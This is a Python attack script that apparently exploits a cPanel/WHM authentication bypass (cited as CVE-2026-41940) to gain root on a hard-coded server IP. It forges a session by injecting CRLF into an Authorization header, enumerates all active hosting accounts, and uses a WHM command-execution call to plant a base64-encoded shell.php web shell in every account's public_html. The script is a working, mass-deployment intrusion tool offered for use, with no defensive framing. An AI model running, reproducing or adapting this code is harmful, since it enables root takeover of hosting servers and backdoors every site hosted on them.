#!/usr/bin/env python3
"""
Mass deploy shell.php using cPanelSniper exploit
Uses CVE-2026-41940 auth bypass to execute shell commands
"""

import sys
import os
sys.path.insert(0, '/root/cPanelSniper')

from cPanelSniper import (
    whm_api, build_url, _do,
    log as cs_log, C, safe_print,
    banner as cs_banner
)
from urllib.parse import quote
import base64
import json
import time

def exploit_target(target_url, timeout=60):
    """
    Exploit target and return context (session, token, etc.)
    """
    from urllib.parse import urlparse, urlsplit

    scheme, netloc = urlparse(target_url)[:2]
    parts = netloc.split(':')
    host = parts[0]
    port = int(parts[1]) if len(parts) > 1 else 2087

    cs_banner()
    cs_log("SCAN", f"Starting exploit chain... {target_url}")
    cs_log("STEP", "Stage 1/4 — Minting preauth session...")

    # Get canonical hostname
    url = build_url(scheme, host, port, "/openid_connect/cpanelid")
    try:
        r = _do(url, timeout=timeout, allow_redirects=False)
        canonical = r.headers.get('Host', host)
        cs_log("INFO", f"Canonical: {canonical}")
    except Exception as e:
        cs_log("ERR", f"Failed to get canonical: {e}")
        return None

    # Stage 1: Preauth session
    cs_log("STEP", "Stage 2/4 — Poisoning session with CRLF...")

    url = build_url(scheme, host, port, "/login/?login_only=1")
    auth_header = "Basic \r\n\t" + "A" * 100 + "\r\n"

    try:
        r = _do(url,
                method="POST",
                body=f"user=root&pass={base64.b64encode(b'wrong').decode()}",
                extra_headers={
                    "Authorization": auth_header,
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                timeout=timeout)

        cookies = dict(r.headers.get_all('Set-Cookie', []))
        session_base = None
        for cookie in cookies:
            if 'whostmgrsession' in str(cookie):
                session_base = cookie.split('=')[1].split(';')[0]
                break

        if not session_base:
            cs_log("ERR", "No session cookie received")
            return None

        cs_log("OK", f"Got session: {session_base[:30]}...")

    except Exception as e:
        cs_log("ERR", f"Preauth failed: {e}")
        return None

    # Stage 2: Poison session
    cs_log("STEP", "Stage 3/4 — Triggering gadget...")

    url = build_url(scheme, host, port, f"/{session_base}/scripts2/listaccts")
    r = _do(url, timeout=timeout)

    # Stage 3: Verify root access
    cs_log("STEP", "Stage 4/4 — Verifying root access...")

    # Extract token from session
    session_parts = session_base.split(':')
    if len(session_parts) > 1:
        token = session_parts[0]
    else:
        token = session_base

    url = build_url(scheme, host, port, f"/{token}/json-api/version")
    s, data = whm_api(scheme, host, port, canonical, session_base, token, "version", {}, timeout)

    if s == 200:
        cs_log("PWNED", f"ROOT ACCESS CONFIRMED! {target_url}")
        return (scheme, host, port, canonical, session_base, token, timeout)
    else:
        cs_log("ERR", f"Exploit failed: HTTP {s}")
        return None

def get_accounts(ctx):
    """List all cPanel accounts"""
    scheme, host, port, canonical, session_base, token, timeout = ctx

    s, data = whm_api(*ctx[:6], "listaccts", {"api.version": "1"}, timeout)

    if s == 200 and isinstance(data, dict):
        accounts = data.get('data', {}).get('acct', [])
        active = [a for a in accounts if a.get('suspended') == 0]
        cs_log("OK", f"Found {len(active)} active accounts")
        return active
    else:
        cs_log("ERR", "Failed to list accounts")
        return []

def upload_shell(ctx, shell_path="/root/cPanelSniper/shell.php"):
    """Upload shell to all active accounts"""

    # Check if shell exists locally
    if not os.path.exists(shell_path):
        cs_log("ERR", f"Shell not found: {shell_path}")
        return

    with open(shell_path, 'rb') as f:
        shell_content = f.read()

    shell_b64 = base64.b64encode(shell_content).decode()
    cs_log("INFO", f"Shell loaded: {len(shell_content)} bytes")

    # Create PHP code to write shell
    php_code = f"""<?php
$base64 = "{shell_b64}";
$content = base64_decode($base64);
file_put_contents($_SERVER['HOME'] . '/public_html/shell.php', $content);
chmod($_SERVER['HOME'] . '/public_html/shell.php', 0644);
echo "OK";
?>"""

    php_b64 = base64.b64encode(php_code.encode()).decode()

    # Get accounts
    accounts = get_accounts(ctx)
    if not accounts:
        return

    cs_log("INFO", "Uploading shell to all accounts...")

    success = 0
    failed = 0

    for acc in accounts:
        user = acc.get('user')
        domain = acc.get('domain')
        idx = success + failed + 1

        if not user:
            continue

        cs_log("INFO", f"[{idx}/{len(accounts)}] {domain} ({user})...")

        # Method: Execute PHP that writes shell
        cmd = f"php -r '{php_code}'"
        s, data = whm_api(*ctx[:6], "scripts/exec", {"command": f"su - {user} -c 'php -r \"{php_code}\"'"}, ctx[6])

        if s == 200:
            output = str(data.get('data', {}).get('output', data))
            if 'OK' in output:
                cs_log("OK", f"  → https://{domain}/shell.php")
                success += 1
            else:
                cs_log("WARN", f"  → No OK in output")
                failed += 1
        else:
            cs_log("ERR", f"  → Failed HTTP {s}")
            failed += 1

        time.sleep(0.3)

    cs_log("INFO", f"\n=== Summary ===")
    cs_log("OK", f"Success: {success}")
    cs_log("ERR", f"Failed: {failed}")
    cs_log("INFO", f"Total: {len(accounts)}")

if __name__ == "__main__":
    target = "https://5.9.241.37:2087"

    ctx = exploit_target(target, timeout=120)

    if ctx:
        upload_shell(ctx)
    else:
        cs_log("ERR", "Exploit failed")
